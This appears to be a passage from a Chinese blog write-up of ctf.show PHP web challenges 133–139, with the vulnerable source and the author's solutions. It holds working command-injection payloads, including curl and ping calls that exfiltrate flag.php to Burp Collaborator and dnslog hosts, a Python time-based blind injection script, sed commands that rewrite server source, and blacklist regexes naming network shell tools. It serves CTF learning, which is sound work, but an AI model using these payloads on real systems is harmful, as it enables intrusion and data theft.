<p>和使用dnslog类似，我们利用burpsuite的一个功能Collaborator Client：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662961399726-2d6e8d48-6a8f-4661-aa92-cd8f35fe5c53.png#averageHue=%23e3e3e2&clientId=u02f1bbe1-f930-4&from=paste&height=262&id=u8fe3292c&name=image.png&originHeight=328&originWidth=1296&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43549&status=done&style=none&taskId=uf7ac65b3-e034-49cb-83d1-6166665eb3a&title=&width=1036.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662961500876-2b853c27-ccb0-4ccc-a31d-faf8d4104f39.png#averageHue=%23f7f5f5&clientId=u02f1bbe1-f930-4&from=paste&height=590&id=u5adc8b2a&name=image.png&originHeight=738&originWidth=1086&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51189&status=done&style=none&taskId=ua5065e60-d681-4d53-b593-a0b98435ed9&title=&width=868.8" alt="image.png"><br>点击copy to clipboard后就会把域名粘贴到我们的剪切板上<br>之后我们payload：<br><code>?F=</code>$F <code>;curl -F &#39;get=@flag.php&#39; [https://m0nwco4mhcch4wlm97f2ij0e359yxn.burpcollaborator.net](https://m0nwco4mhcch4wlm97f2ij0e359yxn.burpcollaborator.net)</code></p>
<p>其中后面的是我们创建的域名</p>
<p>curl -F的意思就是以上传文件的形式发送POST请求<br><code>get=@flag.php</code>就是我们要上传的文件，get是文件的name值，之后刷新：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662962340826-2c53d67f-79a2-4367-b204-f6b9adfca3b7.png#averageHue=%23f4f2f1&clientId=u02f1bbe1-f930-4&from=paste&height=547&id=u108a92d3&name=image.png&originHeight=684&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76286&status=done&style=none&taskId=u869db608-45df-4588-a116-f3180618784&title=&width=726.4" alt="image.png">得到了我们的答案<br>参考：</p>
<h2 id="Web134（POST变量覆盖）"><a href="#Web134（POST变量覆盖）" class="headerlink" title="Web134（POST变量覆盖）"></a>Web134（POST变量覆盖）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>考点：POST变量覆盖<br>首先说一下parse_str,把里面的参数当成在url里传递就行，这个函数会把url编码自动解码，你输入%26会自动给你转码成&amp;，详细知识点在我的<strong>扫盲笔记</strong>里</p>
<p>payload：<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code><br>这里的key1和key2不能用单引号包裹，在<strong>扫盲提到了为什么</strong><br>$_SERVER[‘QUERY_STRING’]是什么前面也讲了<br>这里是运用<code>parse_str</code>去给POST数组赋值<br>然后利用<code>extract</code>去把POST数组内的参数注册为变量</p>
<h2 id="Web135（copy，ping）"><a href="#Web135（copy，ping）" class="headerlink" title="Web135（copy，ping）"></a>Web135（copy，ping）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>都说了是133plus版那肯定是啊<br>payload1：<br><code>?F=</code>$F <code>;cp flag.php 1.txt</code><br>很意外？这一题为什么给了我们写的权限，web133没给啊，可能是出题者的疏忽？</p>
<p>payload2：<br>先去DNSLOG拿个域名：68ignt.dnslog.cn<br><code>?F=</code>$F <code>;ping </code>awk ‘NR&#x3D;&#x3D;15’ flag.php<code>.jxkktp.dnslog.cn</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662965376087-d56baf8e-27ee-4c08-9de3-d34b434ee2b3.png#averageHue=%23c7d7c4&clientId=u02f1bbe1-f930-4&from=paste&height=142&id=u2e0eb0fe&name=image.png&originHeight=178&originWidth=1008&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16655&status=done&style=none&taskId=u396982d0-f49e-4422-bcf7-bcfb4ddb4b3&title=&width=806.4" alt="image.png"><br>出现了一半的答案？<br>我们再payload：<br><code>?F=</code>$F <code>;ping </code>awk ‘NR&#x3D;&#x3D;16’ flag.php<code>.jxkktp.dnslog.cn</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662965403428-38fc0043-a4dc-4523-be5f-bed835863ef0.png#averageHue=%23aad2ee&clientId=u02f1bbe1-f930-4&from=paste&height=165&id=udbb411e3&name=image.png&originHeight=206&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24349&status=done&style=none&taskId=u2e6a8cf2-f40d-486e-be44-6de23e5ff60&title=&width=838.4" alt="image.png"><br>多出了个flag2，好家伙拆成了两个</p>
<p>现在来讲一下payload的意思，<code>awk &#39;NR==15&#39; flag.php</code>的意思是，读取flag.php文件的第十五行，NR是awk指令里的一个常量，所以我们要从1一个个往下面读取<br>详细参考：<br>这里需要说一下由于是三级域名不支持把多行结果粘贴，所以不能用正则匹配去匹配</p>
<p>payload3:<br><code>?F=</code>$F <code>;ping </code>nl flag.php | awk ‘NR&#x3D;&#x3D;15’ |tr -cd “[a-z]”&#x2F;“[0-9]” <code>.jxkktp.dnslog.cn</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662965861572-f6e5baea-2151-4b98-811e-db153f9e5322.png#averageHue=%23abd2ee&clientId=u02f1bbe1-f930-4&from=paste&height=103&id=uf55ef032&name=image.png&originHeight=129&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13926&status=done&style=none&taskId=ude76e470-74f1-4765-826a-54931b8960f&title=&width=766.4" alt="image.png"><br>得到了不带”-“的答案<br>再输入<code>?F=</code>$F <code>;ping </code>nl flag.php | awk ‘NR&#x3D;&#x3D;16’ |tr -cd “[a-z]”&#x2F;“[0-9]” <code>.jxkktp.dnslog.cn</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662965917493-7eeec29a-3483-4c12-93b8-d42b9f7e91a3.png#averageHue=%23a8d0ed&clientId=u02f1bbe1-f930-4&from=paste&height=95&id=u3f85f014&name=image.png&originHeight=119&originWidth=941&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15397&status=done&style=none&taskId=u6fddc317-01c6-40bd-b43e-3fac0f79230&title=&width=752.8" alt="image.png"><br>也是一样不带-的答案</p>
<p>首先awk的意思都知道了<br>至于<code>tr -cd</code>的意思是将我们的flag.php中有关<code>&quot;[a-z]&quot;/&quot;[0-9]&quot;</code>的<code>补集</code>的字符替删除<br>参考：</p>
<p>总而言之骚方法很多</p>
<h2 id="Web136（时间盲注，tee）"><a href="#Web136（时间盲注，tee）" class="headerlink" title="Web136（时间盲注，tee）"></a>Web136（时间盲注，tee）</h2><p>比较出省的一道题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一题呢，首先没告诉你flag在哪里，虽然ping没有完全ban了，但是你不知道文件在那里有个鸡儿用<br>exec指令和shell_exec一样，执行shell命令<br>这两个函数都是执行Linux命令函数，不同的是获取返回结果不一样，<strong>exec只能获取最后一行数据，shell_exec则可以获取全部数据</strong></p>
<ul>
<li>题解一：</li>
</ul>
<p><code>tee</code>：用于读取标准输入的数据，并将其内容输出成文件。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663035526816-884d5c24-12e5-4add-bb68-8245c4b100e4.png#averageHue=%23faf9f9&clientId=u429932cc-497f-4&from=paste&height=602&id=u77735e74&name=image.png&originHeight=752&originWidth=1084&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52211&status=done&style=none&taskId=ue6f00802-7939-4d84-9611-d5fe413cf9b&title=&width=867.2" alt="image.png"><br>tee也和touch一样可以创建新文件<br>我们直接payload：<code>ls|tee 1</code>可以发现没有flag文件<br>继续<code>ls / |tee get</code>，再访问get，可以下载get文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663037505937-3b46b117-c6f6-4258-8f3c-2b4bae7faad8.png#averageHue=%23353e47&clientId=u429932cc-497f-4&from=paste&height=302&id=u631c88bf&name=image.png&originHeight=378&originWidth=583&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16893&status=done&style=none&taskId=u5c296886-35ff-4866-9305-633a58f6eaa&title=&width=466.4" alt="image.png"><br>发现flag文件是f149_15_h3r3<br>再输入：<code>cat /f149_15_h3r3|tee 2</code><br>下载2文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663037374290-1f0034a1-8091-4c1d-9562-ba28cc8dd3c1.png#averageHue=%23baecf3&clientId=u429932cc-497f-4&from=paste&height=150&id=uc3b10fcf&name=image.png&originHeight=188&originWidth=783&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14594&status=done&style=none&taskId=u40411ed7-b501-4513-9eb2-f902ad0d15f&title=&width=626.4" alt="image.png"><br>就可以看到答案了</p>
<ul>
<li>解法二：</li>
</ul>
<p>用bash盲注，有点类似于sql的时间盲注：<br>一步步跑脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">from</span> urllib.parse import quote <span class="keyword">as</span> urlen</span><br><span class="line">url  = <span class="string">&#x27;http://4c396b2c-6e0c-4345-b04b-ce564269569c.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> char in alphabet:</span><br><span class="line">		<span class="comment"># payload = &quot;if [ ` ls | awk &#x27;NR==2&#x27;  |cut -c &#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;.format(i,char) #flag.php</span></span><br><span class="line">		payload = <span class="string">&quot;if [ `cat /f149_15_h3r3 | awk &#x27;NR==1&#x27; |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;</span>.<span class="title function_ invoke__">format</span>(i,char)</span><br><span class="line">		<span class="comment"># data = &#123;&#x27;cmd&#x27;:payload&#125;</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			start = <span class="keyword">int</span>(t.<span class="title function_ invoke__">time</span>())</span><br><span class="line">			r = requests.<span class="title function_ invoke__">get</span>(url+payload)</span><br><span class="line">			<span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">			end = <span class="keyword">int</span>(t.<span class="title function_ invoke__">time</span>()) - start</span><br><span class="line">			<span class="comment"># print(i,char)</span></span><br><span class="line">			<span class="keyword">if</span> end &gt;= <span class="number">3</span>:</span><br><span class="line">				result += char</span><br><span class="line">				<span class="keyword">print</span>(<span class="string">&quot;Flag: &quot;</span>+result)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用NR&#x3D;&#x3D;去读行数，一行行的读！所以很复杂，首先先读取目录，看看flag在哪儿<br><code>payload = &quot;if [ </code> ls &#x2F; -1 | awk ‘NR&#x3D;&#x3D;x’  |cut -c {}<code> = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char)</code><br><code>ls / -1</code>是让他以每行一个文件名的形式排列<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663051837795-8f99b487-a35b-461e-ae21-36ec9c87bf76.png#averageHue=%2321262f&clientId=u650fcd13-5d51-4&from=paste&height=337&id=u9ca065de&name=image.png&originHeight=421&originWidth=385&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43637&status=done&style=none&taskId=u8964297f-f14d-421a-9735-36a1a26e6b8&title=&width=308" alt="image.png"><br>这里format是python里的占位符，然后cut是一个选取命令：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663039237104-3b59fb11-2665-48b1-a715-b2548dac885f.png#averageHue=%23fdfcee&clientId=u429932cc-497f-4&from=paste&height=266&id=u211db7d6&name=image.png&originHeight=333&originWidth=1319&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52603&status=done&style=none&taskId=u18bace2c-ee31-4237-8b2d-593f508ac4b&title=&width=1055.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663039252506-db955f03-482b-454f-949d-a30959888541.png#averageHue=%23fdfcef&clientId=u429932cc-497f-4&from=paste&height=370&id=u2dd07fe6&name=image.png&originHeight=463&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33314&status=done&style=none&taskId=u79e752fe-e14e-4b1e-8e1e-c9711ea984f&title=&width=752" alt="image.png"></p>
<p>不断的替换x去读不同的行号，所以会很慢<br>最后锁定在&#x2F;f149_15_h3r3里<br><code>payload = &quot;if [ </code>cat &#x2F;f149_15_h3r3 | awk ‘NR&#x3D;&#x3D;1’ |cut -c{}<code> = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char)</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663037804368-51599b04-c54b-44cc-bb9c-71667269368f.png#averageHue=%2331302e&clientId=u429932cc-497f-4&from=paste&height=105&id=ucb42f6af&name=image.png&originHeight=131&originWidth=743&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23502&status=done&style=none&taskId=u82941582-f4d5-4951-b796-2b27fbf306a&title=&width=594.4" alt="image.png"><br>flag的格式是8-4-4-4-12<br>有一些读错了可能是bug，整体还是没错的<br>有关shell中if语句的有关参考：</p>
<ul>
<li>题解三：</li>
</ul>
<p>我愿意称之为最骚的方法，可以直接修改源码的指令<br>ls | xargs sed -i “s&#x2F;die&#x2F;echo&#x2F;“<br>ls | xargs sed -i “s&#x2F;exec&#x2F;system&#x2F;“<br>这两条指令相当于把当前目录下文件中的die换成echo，exec换成system<br>直接随便乱搞一通了<br><code>payload:?c=tac f*</code><br>有关sed和xargs指令参考：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663040401203-d2504a18-0923-4f1c-8f4f-1137a3ab09e4.png#averageHue=%23fefdfd&clientId=u429932cc-497f-4&from=paste&height=354&id=u348fd1ae&name=image.png&originHeight=442&originWidth=1532&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16215&status=done&style=none&taskId=u07768695-3f95-46ac-b891-666e9c11203&title=&width=1225.6" alt="image.png"><br>偷梁换柱，这里换成了eval，想测试测试木马（）<br>总结：骚题目，太骚了</p>
<h2 id="Web137（-访问static）"><a href="#Web137（-访问static）" class="headerlink" title="Web137（::访问static）"></a>Web137（::访问static）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>略微脑瘫<br>PAYLOAD：<br>ctfshow&#x3D;ctfshow::getFlag<br>访问静态方法</p>
<h2 id="Web138-call-user-func和数组）"><a href="#Web138-call-user-func和数组）" class="headerlink" title="Web138(call_user_func和数组）"></a>Web138(call_user_func和数组）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>call_user_func看来我还是不太熟练啊<br>这个函数可以通过传递数组参数来调用类里的方法或者是函数方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663046589609-3e6604b8-67f3-402a-9e1d-af120f7f0a9b.png#averageHue=%23fcfbfb&clientId=u650fcd13-5d51-4&from=paste&height=648&id=u17d9eb6e&name=image.png&originHeight=810&originWidth=1261&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52523&status=done&style=none&taskId=u2965816b-db6b-4fc6-9760-a15a5dadef9&title=&width=1008.8" alt="image.png"><br>所以payload：<br>ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag<br>这样可以用数组绕过strripos函数，又可以访问静态对象</p>
<h2 id="Web139（bash盲注）"><a href="#Web139（bash盲注）" class="headerlink" title="Web139（bash盲注）"></a>Web139（bash盲注）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
